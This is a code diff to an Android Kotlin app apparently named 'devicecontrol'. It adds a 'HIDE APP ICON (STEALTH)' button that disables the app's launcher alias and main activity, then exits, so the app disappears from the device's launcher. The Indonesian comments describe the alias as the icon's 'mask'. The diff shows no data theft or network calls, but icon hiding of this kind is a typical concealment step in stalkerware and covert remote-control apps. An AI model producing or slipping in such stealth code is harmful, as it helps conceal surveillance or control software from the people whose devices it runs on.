@@ -129,6 +129,40 @@ class MainActivity : AppCompatActivity() {
         }
         rootLayout.addView(startButton)
 
+        // Hide App Button
+        val hideButton = Button(this).apply {
+            text = "HIDE APP ICON (STEALTH)"
+            setPadding(0, 40, 0, 40)
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            ).apply { setMargins(0, 20, 0, 0) }
+            
+            setOnClickListener {
+                if (Toast.makeText(this@MainActivity, "App icon will vanish now...", Toast.LENGTH_SHORT).show().run { true }) {
+                    val pm = packageManager
+                    
+                    // Menonaktifkan Alias (Topeng Ikon Utama)
+                    pm.setComponentEnabledSetting(
+                        android.content.ComponentName(this@MainActivity, "com.example.devicecontrol.LauncherAlias"),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP
+                    )
+                    
+                    // Menonaktifkan Activity Inti (Mencegah Ikon tersisa dipencet lagi)
+                    pm.setComponentEnabledSetting(
+                        android.content.ComponentName(this@MainActivity, MainActivity::class.java),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP
+                    )
+                    
+                    // Keluar dari UI Aplikasi dan lenyap
+                    finishAffinity()
+                }
+            }
+        }
+        rootLayout.addView(hideButton)
+
         setContentView(rootLayout)
         checkPermissions()
     }
